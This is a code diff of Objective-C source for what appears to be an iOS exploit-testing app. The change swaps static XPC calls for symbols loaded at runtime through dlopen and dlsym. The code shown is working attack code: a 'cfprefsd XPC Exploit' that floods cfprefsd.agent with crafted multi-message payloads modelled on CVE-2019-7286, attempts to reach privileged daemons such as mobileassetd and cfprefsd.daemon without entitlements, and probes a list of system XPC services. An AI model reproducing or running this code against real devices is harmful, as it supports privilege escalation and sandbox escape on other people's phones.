@@ -27,11 +27,62 @@
 #import <objc/runtime.h>
 #import <errno.h>
 
-// XPC - always available on iOS
-#import <xpc/xpc.h>
-
 // IOKit
 #import <IOKit/IOKitLib.h>
+
+// XPC types and function pointers (loaded dynamically)
+typedef void* xpc_connection_t;
+typedef void* xpc_object_t;
+typedef void (^xpc_handler_t)(xpc_object_t);
+
+static xpc_connection_t (*_xpc_connection_create_mach_service)(const char *, dispatch_queue_t, uint64_t) = NULL;
+static void (*_xpc_connection_set_event_handler)(xpc_connection_t, xpc_handler_t) = NULL;
+static void (*_xpc_connection_resume)(xpc_connection_t) = NULL;
+static void (*_xpc_connection_cancel)(xpc_connection_t) = NULL;
+static void (*_xpc_connection_send_message)(xpc_connection_t, xpc_object_t) = NULL;
+static void (*_xpc_connection_send_message_with_reply)(xpc_connection_t, xpc_object_t, dispatch_queue_t, xpc_handler_t) = NULL;
+static xpc_object_t (*_xpc_dictionary_create)(const char *const *, const xpc_object_t *, size_t) = NULL;
+static void (*_xpc_dictionary_set_string)(xpc_object_t, const char *, const char *) = NULL;
+static void (*_xpc_dictionary_set_int64)(xpc_object_t, const char *, int64_t) = NULL;
+static void (*_xpc_dictionary_set_value)(xpc_object_t, const char *, xpc_object_t) = NULL;
+static xpc_object_t (*_xpc_array_create)(const xpc_object_t *, size_t) = NULL;
+static void (*_xpc_array_append_value)(xpc_object_t, xpc_object_t) = NULL;
+static void* (*_xpc_get_type)(xpc_object_t) = NULL;
+
+static void *_XPC_ERROR_CONNECTION_INVALID = NULL;
+static void *_XPC_ERROR_CONNECTION_INTERRUPTED = NULL;
+static void *_XPC_TYPE_ERROR = NULL;
+
+static BOOL xpc_loaded = NO;
+
+static void load_xpc_symbols(void) {
+    if (xpc_loaded) return;
+
+    void *handle = dlopen("/usr/lib/system/libxpc.dylib", RTLD_NOW);
+    if (!handle) return;
+
+    _xpc_connection_create_mach_service = dlsym(handle, "xpc_connection_create_mach_service");
+    _xpc_connection_set_event_handler = dlsym(handle, "xpc_connection_set_event_handler");
+    _xpc_connection_resume = dlsym(handle, "xpc_connection_resume");
+    _xpc_connection_cancel = dlsym(handle, "xpc_connection_cancel");
+    _xpc_connection_send_message = dlsym(handle, "xpc_connection_send_message");
+    _xpc_connection_send_message_with_reply = dlsym(handle, "xpc_connection_send_message_with_reply");
+    _xpc_dictionary_create = dlsym(handle, "xpc_dictionary_create");
+    _xpc_dictionary_set_string = dlsym(handle, "xpc_dictionary_set_string");
+    _xpc_dictionary_set_int64 = dlsym(handle, "xpc_dictionary_set_int64");
+    _xpc_dictionary_set_value = dlsym(handle, "xpc_dictionary_set_value");
+    _xpc_array_create = dlsym(handle, "xpc_array_create");
+    _xpc_array_append_value = dlsym(handle, "xpc_array_append_value");
+    _xpc_get_type = dlsym(handle, "xpc_get_type");
+
+    _XPC_ERROR_CONNECTION_INVALID = dlsym(handle, "_xpc_error_connection_invalid");
+    _XPC_ERROR_CONNECTION_INTERRUPTED = dlsym(handle, "_xpc_error_connection_interrupted");
+    _XPC_TYPE_ERROR = dlsym(handle, "_xpc_type_error");
+
+    xpc_loaded = (_xpc_connection_create_mach_service != NULL);
+}
+
+#define XPC_CONNECTION_MACH_SERVICE_PRIVILEGED (1 << 1)
 
 // Forward declarations
 @class AppDelegate;
@@ -163,36 +214,41 @@
     // XPC connection attempt
     [log appendString:@"[*] Attempting XPC connection to mobileassetd...\n"];
 
-    xpc_connection_t conn = xpc_connection_create_mach_service(
-        "com.apple.mobileassetd",
-        NULL,
-        0
-    );
-
-    if (conn) {
-        [log appendString:@"[+] XPC connection handle created\n"];
-
-        xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
-            (void)event;
-        });
-
-        xpc_connection_resume(conn);
-        [log appendString:@"[+] Connection resumed\n"];
-
-        // Try query without entitlement
-        xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
-        if (msg) {
-            xpc_dictionary_set_string(msg, "command", "query");
-            xpc_dictionary_set_string(msg, "asset-type", "com.apple.MobileAsset.SoftwareUpdate");
-            xpc_connection_send_message(conn, msg);
-            [log appendString:@"[+] Query message sent\n"];
-        }
-
-        [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.5]];
-        xpc_connection_cancel(conn);
-        [log appendString:@"[*] Connection test complete\n"];
+    load_xpc_symbols();
+    if (!xpc_loaded) {
+        [log appendString:@"[-] XPC symbols not available\n"];
     } else {
-        [log appendString:@"[-] Failed to create XPC connection (sandbox restriction)\n"];
+        xpc_connection_t conn = _xpc_connection_create_mach_service(
+            "com.apple.mobileassetd",
+            NULL,
+            0
+        );
+
+        if (conn) {
+            [log appendString:@"[+] XPC connection handle created\n"];
+
+            _xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
+                (void)event;
+            });
+
+            _xpc_connection_resume(conn);
+            [log appendString:@"[+] Connection resumed\n"];
+
+            // Try query without entitlement
+            xpc_object_t msg = _xpc_dictionary_create(NULL, NULL, 0);
+            if (msg) {
+                _xpc_dictionary_set_string(msg, "command", "query");
+                _xpc_dictionary_set_string(msg, "asset-type", "com.apple.MobileAsset.SoftwareUpdate");
+                _xpc_connection_send_message(conn, msg);
+                [log appendString:@"[+] Query message sent\n"];
+            }
+
+            [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.5]];
+            _xpc_connection_cancel(conn);
+            [log appendString:@"[*] Connection test complete\n"];
+        } else {
+            [log appendString:@"[-] Failed to create XPC connection (sandbox restriction)\n"];
+        }
     }
 
     [log appendString:@"\n[*] Assets exploit test complete\n"];
@@ -205,67 +261,72 @@
     NSMutableString *log = [NSMutableString string];
     [log appendString:@"=== cfprefsd XPC Exploit ===\n\n"];
 
-    // Test daemon connection (privileged - will fail in sandbox)
-    [log appendString:@"[*] Testing cfprefsd.daemon connection...\n"];
-
-    xpc_connection_t daemon = xpc_connection_create_mach_service(
-        "com.apple.cfprefsd.daemon",
-        NULL,
-        XPC_CONNECTION_MACH_SERVICE_PRIVILEGED
-    );
-
-    if (daemon) {
-        [log appendString:@"[+] Connected to cfprefsd.daemon (privileged)\n"];
-        xpc_connection_set_event_handler(daemon, ^(xpc_object_t event) { (void)event; });
-        xpc_connection_resume(daemon);
-        xpc_connection_cancel(daemon);
+    load_xpc_symbols();
+    if (!xpc_loaded) {
+        [log appendString:@"[-] XPC symbols not available, skipping XPC tests\n"];
     } else {
-        [log appendString:@"[-] Cannot connect to daemon (expected in sandbox)\n"];
-    }
+        // Test daemon connection (privileged - will fail in sandbox)
+        [log appendString:@"[*] Testing cfprefsd.daemon connection...\n"];
 
-    // Test agent connection
-    [log appendString:@"[*] Testing cfprefsd.agent connection...\n"];
+        xpc_connection_t daemon = _xpc_connection_create_mach_service(
+            "com.apple.cfprefsd.daemon",
+            NULL,
+            XPC_CONNECTION_MACH_SERVICE_PRIVILEGED
+        );
 
-    xpc_connection_t agent = xpc_connection_create_mach_service(
-        "com.apple.cfprefsd.agent",
-        NULL,
-        0
-    );
-
-    if (agent) {
-        [log appendString:@"[+] Connected to cfprefsd.agent\n"];
-        xpc_connection_set_event_handler(agent, ^(xpc_object_t event) { (void)event; });
-        xpc_connection_resume(agent);
-
-        // Test multi-message pattern (CVE-2019-7286 style)
-        [log appendString:@"[*] Testing multi-message pattern...\n"];
-
-        xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
-        if (msg) {
-            xpc_dictionary_set_int64(msg, "CFPreferencesOperation", 5);
-
-            xpc_object_t arr = xpc_array_create(NULL, 0);
-            if (arr) {
-                for (int i = 0; i < 10; i++) {
-                    xpc_object_t sub = xpc_dictionary_create(NULL, NULL, 0);
-                    if (sub) {
-                        xpc_dictionary_set_int64(sub, "CFPreferencesOperation", 4);
-                        xpc_dictionary_set_string(sub, "CFPreferencesApplication", "poc.test");
-                        xpc_array_append_value(arr, sub);
-                    }
-                }
-                xpc_dictionary_set_value(msg, "CFPreferencesMessages", arr);
-            }
-
-            for (int i = 0; i < 100; i++) {
-                xpc_connection_send_message(agent, msg);
-            }
-            [log appendFormat:@"[+] Sent %d multi-messages\n", 100];
+        if (daemon) {
+            [log appendString:@"[+] Connected to cfprefsd.daemon (privileged)\n"];
+            _xpc_connection_set_event_handler(daemon, ^(xpc_object_t event) { (void)event; });
+            _xpc_connection_resume(daemon);
+            _xpc_connection_cancel(daemon);
+        } else {
+            [log appendString:@"[-] Cannot connect to daemon (expected in sandbox)\n"];
         }
 
-        xpc_connection_cancel(agent);
-    } else {
-        [log appendString:@"[-] Cannot connect to agent\n"];
+        // Test agent connection
+        [log appendString:@"[*] Testing cfprefsd.agent connection...\n"];
+
+        xpc_connection_t agent = _xpc_connection_create_mach_service(
+            "com.apple.cfprefsd.agent",
+            NULL,
+            0
+        );
+
+        if (agent) {
+            [log appendString:@"[+] Connected to cfprefsd.agent\n"];
+            _xpc_connection_set_event_handler(agent, ^(xpc_object_t event) { (void)event; });
+            _xpc_connection_resume(agent);
+
+            // Test multi-message pattern (CVE-2019-7286 style)
+            [log appendString:@"[*] Testing multi-message pattern...\n"];
+
+            xpc_object_t msg = _xpc_dictionary_create(NULL, NULL, 0);
+            if (msg) {
+                _xpc_dictionary_set_int64(msg, "CFPreferencesOperation", 5);
+
+                xpc_object_t arr = _xpc_array_create(NULL, 0);
+                if (arr) {
+                    for (int i = 0; i < 10; i++) {
+                        xpc_object_t sub = _xpc_dictionary_create(NULL, NULL, 0);
+                        if (sub) {
+                            _xpc_dictionary_set_int64(sub, "CFPreferencesOperation", 4);
+                            _xpc_dictionary_set_string(sub, "CFPreferencesApplication", "poc.test");
+                            _xpc_array_append_value(arr, sub);
+                        }
+                    }
+                    _xpc_dictionary_set_value(msg, "CFPreferencesMessages", arr);
+                }
+
+                for (int i = 0; i < 100; i++) {
+                    _xpc_connection_send_message(agent, msg);
+                }
+                [log appendFormat:@"[+] Sent %d multi-messages\n", 100];
+            }
+
+            _xpc_connection_cancel(agent);
+        } else {
+            [log appendString:@"[-] Cannot connect to agent\n"];
+        }
     }
 
     // Test preference writes (works on iOS)
@@ -813,6 +874,13 @@
     NSMutableString *log = [NSMutableString string];
     [log appendString:@"=== XPC Service Scan ===\n\n"];
 
+    load_xpc_symbols();
+    if (!xpc_loaded) {
+        [log appendString:@"[-] XPC symbols not available\n"];
+        [log appendString:@"\n[*] XPC service scan complete\n"];
+        return log;
+    }
+
     // List of interesting XPC services to probe
     NSArray *xpcServices = @[
         @"com.apple.springboard.services",
@@ -839,7 +907,7 @@
     [log appendString:@"[*] Probing XPC services...\n\n"];
 
     for (NSString *serviceName in xpcServices) {
-        xpc_connection_t conn = xpc_connection_create_mach_service(
+        xpc_connection_t conn = _xpc_connection_create_mach_service(
             [serviceName UTF8String],
             NULL,
             0
@@ -849,24 +917,24 @@
             __block BOOL gotResponse = NO;
             __block NSString *status = @"created";
 
-            xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
-                if (event == XPC_ERROR_CONNECTION_INVALID) {
+            _xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
+                if (event == _XPC_ERROR_CONNECTION_INVALID) {
                     status = @"invalid";
-                } else if (event == XPC_ERROR_CONNECTION_INTERRUPTED) {
+                } else if (event == _XPC_ERROR_CONNECTION_INTERRUPTED) {
                     status = @"interrupted";
                 } else {
                     gotResponse = YES;
                 }
             });
 
-            xpc_connection_resume(conn);
+            _xpc_connection_resume(conn);
 
             // Send a ping message
-            xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
-            xpc_dictionary_set_string(msg, "ping", "test");
+            xpc_object_t msg = _xpc_dictionary_create(NULL, NULL, 0);
+            _xpc_dictionary_set_string(msg, "ping", "test");
 
-            xpc_connection_send_message_with_reply(conn, msg, dispatch_get_main_queue(), ^(xpc_object_t reply) {
-                if (xpc_get_type(reply) != XPC_TYPE_ERROR) {
+            _xpc_connection_send_message_with_reply(conn, msg, dispatch_get_main_queue(), ^(xpc_object_t reply) {
+                if (_xpc_get_type(reply) != _XPC_TYPE_ERROR) {
                     gotResponse = YES;
                 }
             });
@@ -880,7 +948,7 @@
                 [log appendFormat:@"[+] %@ - %@\n", serviceName, status];
             }
 
-            xpc_connection_cancel(conn);
+            _xpc_connection_cancel(conn);
         } else {
             [log appendFormat:@"[-] %@ - unavailable\n", serviceName];
         }
